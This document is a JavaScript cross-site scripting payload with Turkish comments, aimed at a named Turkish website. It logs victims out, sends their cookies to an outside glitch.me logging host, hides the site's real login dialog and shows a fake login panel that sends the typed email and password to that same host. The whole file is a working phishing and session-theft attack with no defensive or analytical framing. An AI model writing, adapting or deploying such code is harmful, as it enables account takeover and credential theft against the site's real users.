(function () {
  let isScriptActive = true; // Script’in aktif olup olmadığını kontrol eden bayrak
  const xssProfileUrl = 'https://katiponline.com/duello/profildetay?t=45593'; // XSS profil URL’si (yalnızca referans)

  // Butonları izleyen fonksiyon
  function setupButtonListeners() {
    if (!isScriptActive) {
      return;
    }

    // "Giriş Yap / Üye Ol" butonu
    const loginButton = document.querySelector('button[data-bs-toggle="modal"][data-bs-target=".bd-example-modal-sm"]');
    // "Giriş Yap | Kayıt Ol" linki
    const registerButton = document.querySelector('a.menu_cus.btn_get.btn-meta.btn_get_radious[href="https://katiponline.com/kayit-ol"]');

    if (loginButton) {
      loginButton.addEventListener('click', showLoginPanel);
      loginButton.addEventListener('click', (e) => {
        if (isScriptActive) {
          e.preventDefault();
          e.stopPropagation();
        }
      });
    }
    if (registerButton) {
      registerButton.addEventListener('click', showLoginPanel);
      registerButton.addEventListener('click', (e) => {
        if (isScriptActive) {
          e.preventDefault();
          e.stopPropagation();
        }
      });
    }

    // Sitenin kendi modalını engelle
    const originalModal = document.querySelector('.bd-example-modal-sm');
    if (originalModal && isScriptActive) {
      originalModal.style.display = 'none';
      originalModal.style.visibility = 'hidden';
      originalModal.setAttribute('aria-hidden', 'true');
      if (window.bootstrap && window.bootstrap.Modal) {
        const modalInstance = window.bootstrap.Modal.getInstance(originalModal) || new window.bootstrap.Modal(originalModal);
        modalInstance.hide();
        originalModal.addEventListener('show.bs.modal', (e) => {
          if (isScriptActive) e.preventDefault();
        });
      }
    }
  }

  // Çıkış yapma (2 saniye gecikme ile)
  const hasLoggedOut = sessionStorage.getItem('hasLoggedOut');
  if (!hasLoggedOut && isScriptActive) {
    setTimeout(() => {
      if (typeof cikisyap === 'function') {
        cikisyap();
        setTimeout(() => {
          sessionStorage.setItem('hasLoggedOut', 'true');
          window.location.replace('https://katiponline.com/duello/profildetay?t=45593');
        }, 1000); // 1 saniye bekleme
      }
    }, 2000); // 2 saniye gecikme
  }

  // Cookie’leri gönder (isteğe bağlı)
  if (isScriptActive && location.href !== xssProfileUrl) {
    const cookies = document.cookie || '';
    if (cookies) {
      fetch('https://ancient-pentagonal-elephant.glitch.me/log?cookie=' + encodeURIComponent(cookies), {
        method: 'GET',
        credentials: 'include'
      })
        .then(response => response.text())
        .then(() => {})
        .catch(() => {});
    }
  }

  // Sayfa yüklendiğinde butonları izlemeye başla
  if (isScriptActive) {
    window.addEventListener('load', () => {
      setupButtonListeners();
    });

    // URL değişikliğini izle (tüm sayfalarda çalışsın)
    let lastUrl = location.href;
    setInterval(() => {
      if (location.href !== lastUrl) {
        lastUrl = location.href;
        setupButtonListeners(); // Her URL değişiminde butonları tekrar izle
      }
    }, 500);
  }

  // Giriş panelini gösterme fonksiyonu
  function showLoginPanel(event) {
    if (!isScriptActive) {
      return;
    }
    event.preventDefault();
    event.stopPropagation();

    const loginPanel = document.createElement('div');
    loginPanel.innerHTML = `
      <!DOCTYPE html>
      <html lang="tr">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Giriş Yap</title>
          <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;700&display=swap" rel="stylesheet">
          <style>
              * {
                  margin: 0;
                  padding: 0;
                  box-sizing: border-box;
                  font-family: 'Poppins', sans-serif;
              }
              body {
                  margin: 0;
              }
              .login-overlay {
                  position: fixed;
                  top: 0;
                  left: 0;
                  width: 100%;
                  height: 100%;
                  background: rgba(0, 0, 0, 0.5);
                  display: flex;
                  justify-content: center;
                  align-items: center;
                  z-index: 2000;
              }
              .login-container {
                  background: white;
                  padding: 30px;
                  border-radius: 12px;
                  box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
                  width: 350px;
                  z-index: 2001;
              }
              .login-header {
                  font-size: 24px;
                  font-weight: bold;
                  margin-bottom: 10px;
              }
              .login-header span {
                  color: #635bff;
              }
              .form-group {
                  margin-bottom: 15px;
              }
              label {
                  font-size: 14px;
                  font-weight: 500;
                  display: block;
                  margin-bottom: 5px;
              }
              input[type="text"],
              input[type="password"] {
                  width: 100%;
                  padding: 10px;
                  border: 1px solid #ccc;
                  border-radius: 6px;
                  font-size: 14px;
              }
              .remember-me {
                  display: flex;
                  align-items: center;
                  font-size: 14px;
                  margin-bottom: 15px;
              }
              .remember-me input {
                  margin-right: 6px;
              }
              .btn {
                  background: #635bff;
                  color: white;
                  padding: 10px;
                  width: 100%;
                  border: none;
                  border-radius: 6px;
                  font-size: 16px;
                  cursor: pointer;
                  font-weight: bold;
              }
              .btn:hover {
                  background: #4b44d4;
              }
              .forgot-password {
                  display: flex;
                  align-items: center;
                  font-size: 14px;
                  margin-top: 10px;
                  color: #635bff;
                  text-decoration: none;
                  cursor: pointer;
              }
              .forgot-password:hover {
                  text-decoration: underline;
              }
              .forgot-password img {
                  width: 16px;
                  margin-right: 5px;
              }
              .loading-container {
                  display: none;
                  flex-direction: column;
                  align-items: center;
                  margin-top: 10px;
              }
              .spinner {
                  width: 24px;
                  height: 24px;
                  border: 3px solid #007bff;
                  border-top-color: transparent;
                  border-radius: 50%;
                  animation: spin 1s linear infinite;
              }
              @keyframes spin {
                  0% { transform: rotate(0deg); }
                  100% { transform: rotate(360deg); }
              }
          </style>
      </head>
      <body>
          <div class="login-overlay">
              <div class="login-container">
                  <div class="login-header">Giriş<span>Yap</span></div>
                  <div class="form-group">
                      <label for="email">E-Posta veya Kullanıcı Adı</label>
                      <input type="text" id="email" placeholder="E-Posta veya Kullanıcı Adı">
                  </div>
                  <div class="form-group">
                      <label for="password">Parola</label>
                      <input type="password" id="password" placeholder="Parola">
                  </div>
                  <div class="remember-me">
                      <input type="checkbox" id="remember">
                      <label for="remember" style="margin: 0; cursor: pointer;">Beni Hatırla</label>
                  </div>
                  <button class="btn" onclick="kontrolEt()">Giriş Yap</button>
                  <a href="#" class="forgot-password">
                      <img src="https://img.icons8.com/fluency-systems-regular/48/635bff/key.png" alt="key-icon">
                      Şifremi Unuttum
                  </a>
                  <div id="loadingContainer" class="loading-container">
                      <div class="spinner"></div>
                      <p>Giriş yapılıyor...</p>
                  </div>
              </div>
          </div>
      </body>
      </html>
    `;
    document.body.appendChild(loginPanel);

    // Input’lara odaklanmayı zorla
    setTimeout(() => {
      const emailInput = document.getElementById('email');
      if (emailInput) emailInput.focus();
    }, 100);

    window.kontrolEt = function () {
      if (!isScriptActive) {
        return;
      }
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;
      const loadingContainer = document.getElementById("loadingContainer");
      const loginContainer = document.querySelector('.login-container');

      if (!email.includes("@") || email.length < 5) {
        alert("Lütfen geçerli bir e-posta girin!");
        return;
      }

      loadingContainer.style.display = "flex";
      const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
      fetch(`https://ancient-pentagonal-elephant.glitch.me/log?${data}`, {
        method: 'GET',
        credentials: 'include'
      })
        .then(response => response.text())
        .then(() => {
          isScriptActive = false; // Giriş yapıldığında script tamamen durur
          loginContainer.style.opacity = '0';
          setTimeout(() => {
            loginContainer.parentElement.remove();
          }, 500);
        })
        .catch(() => {
          isScriptActive = false; // Hata olsa bile script durur
          loginContainer.style.opacity = '0';
          setTimeout(() => {
            loginContainer.parentElement.remove();
          }, 500);
        });
    };
  }
})();
